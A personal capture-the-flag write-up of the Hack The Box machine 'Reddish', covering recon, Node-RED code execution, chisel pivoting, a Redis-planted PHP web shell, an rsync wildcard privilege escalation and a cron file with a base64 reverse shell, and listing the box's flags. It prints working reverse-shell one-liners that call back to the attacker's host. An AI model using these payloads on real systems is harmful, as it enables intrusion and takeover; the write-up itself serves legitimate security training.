```json
Alias: Reddish
Date: 07-05_2025
Platform: Hackthebox
OS: Linux
Difficulty: Insane
Status: Complete
IP: 10.10.10.94
```

# Reddish
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering

At first, we don't find any open ports with the normal nmap scan, this means a full port scan but that takes a long time with nmap, so I like to use `masscan` for that.

```bash
sudo masscan $IP -p- -e tun0 --rate 1000
```

And we get the results in just a few minutes.

```
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-05-08 08:05:02 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 1880/tcp on 10.10.10.94
```

Next, we can perform a detailed scan on the open port using nmap

```bash
nmap $IP -p 1880 -sC -sV
```
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 13:09 PKT
Nmap scan report for 10.10.10.94
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.21 seconds
```

---
# Enumeration
## Port 1880

Apparently something called Node Red https://nodered.org/ is running on this port. The summary for node red says

```
Node-RED's goal is to enable anyone to build applications that collect, transform and visualize their data; building flows that can automate their world. Its low-code nature makes it accessible to users of any background, whether for home automation, industrial control systems or anything in between.
```

Visiting it just says `Cannot GET /`, but if we send a `POST` request, we get

```
{"id":"3bce264bc0224a6f0dd35e400efd6be0","ip":"::ffff:10.10.14.96","path":"/red/{id}"}
```
We can then visit `/red/[id]` to get access to the interface.


---

# Exploitation

Node red is a programming language which uses blocks similar to scratch. One of the interesting blocks, at the very end is exec.

We can setup the following structure of blocks

![[Pasted image 20250508150029.png]]

Where the first one is a trigger, the second one is `Exec` block, and the other three are debug blocks.

Use this payload on the Exec block

```bash
bash -c '0<&196;exec 196<>/dev/tcp/10.10.14.96/4444; sh <&196 >&196 2>&196'
```

Make sure the listener is running first!

After everything is ready, click the deploy button on top right and then press the little square to the left of the trigger block. If everything goes well we should get a shell.

`ip addr` shows that we have two network interfaces `172.19.0.0/16` an `172.18.0.0/16`. So, let's set up a socks proxy using chisel.

Perform a nmap ping scan

```bash
proxychains nmap -sn 172.19.0.0/16
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 18:01 PKT
Nmap scan report for 172.19.0.1
Host is up (0.49s latency).
Nmap scan report for 172.19.0.2
Host is up (0.64s latency).
Nmap scan report for 172.19.0.3
Host is up (0.45s latency).
Nmap done: 4 IP addresses (4 hosts up)
```

so perform a full nmap scan on that

```bash
proxychains nmap -sC -sV 172.19.0.3
```

```
Nmap scan report for 172.19.0.3
Host is up (0.31s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Reddish

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 746.55 seconds
```

If we look at the HTML source in the website, we can see

```
/*
							* TODO
							*
							* 1. Share the web folder with the database container (Done)
							* 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
							* ...Still don't know how to complete it...
						*/
```

Doing a full port scan on 172.19.0.2 we see port 6739 open which is used for `Redis`.

```bash
for port in $(seq 1 10000); do (echo reddish > /dev/tcp/172.19.0.2/$port && echo $port) 2> /dev/null; done
```

To connect to redis

```bash
proxychains redis-cli -h 172.19.0.2
```

After trying a bunch of different directories, I found out that the directory mentioned in the html source code is mounted here `/var/www/html/f187a0ec71ce99642e4f0afbd441a68b`. We can use redis to upload a php web shell first.

```bash
CONFIG SET dir /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['cmd']); ?>"
SAVE
```

Next, lets upload a php reverse shell. Get your favorite php reverse shell and host it using netcat.

```bash
nc -lvnp 8001 < rev.php
```

Also remember that the database container can't access our IP directly. So we will have to setup some ports on `172.19.0.4` (Original Node Red) box to redirect traffic to our machine. First I set up the port to transfer the reverse shell using chisel, run this on `172.19.0.4`

```bash
./chisel client 10.10.14.96:8080 0.0.0.0:8001:127.0.0.1:8001
```

Now, when `172.19.0.3` will try to communicate to `172.19.0.4:8001`, the traffic will be redirected to our machine port 8001. Do the same for the port where the reverse shell will reach out

```bash
./chisel client 10.10.14.96:8080 0.0.0.0:4445:127.0.0.1:4445
```

Use the webshell to download the reverse shell

```
http://172.19.0.3/f187a0ec71ce99642e4f0afbd441a68b/shell.php?cmd=bash%20-c%20%27cat%20%3C%20/dev/tcp/172.19.0.4/8001%20%3E%20rev.php%27
```

and execute

```bash
http://172.19.0.3/f187a0ec71ce99642e4f0afbd441a68b/rev.php
```

and if everything went right, you should get a shell to `172.19.0.3`

the file `/backup/backup.sh` is run regularly by root. The file runs rsync with `*` wildcard so privesc is possible

Compile this file and transfer to box similar to `rev.php`

```c
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", NULL);
}
```


```bash
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
cat << EOF > reddish.rdb
#!/bin/bash
chown root /tmp/privesc
chmod 4755 /tmp/privesc
EOF
touch -- '-e sh reddish.rdb'
```

# Privilege Escalation

Notice that we can arbitrarily read and write files from backup `172.20.0.2`, so the next step is transfer chisel to `172.19.0.3` and setup a chain of tunnels back to our host machine, next 

```bash
echo '* * * * * root echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMC4zLzY2NjYgMD4mMQo= | base64 -d | bash' > clean
rsync -avp clean rsync://backup:873/src/etc/cron.d/clean
```

make sure clean is owned by root.

Setup a listener and we should get a shell. This is still a docker container, to get to the host file system

```bash
mount /dev/sda2 /mnt
```

And get root flag.

The reason behind laziness and low quality is that it's 4 am and I want to sleep I have exams on going. I have been solving this box for 15 hours now.

---

# Flags
- abc5790a9d3c464d5bd0bb4b5d3cfe8f
- 8368b97c834fd7c710499b37a2925cf1

#CTF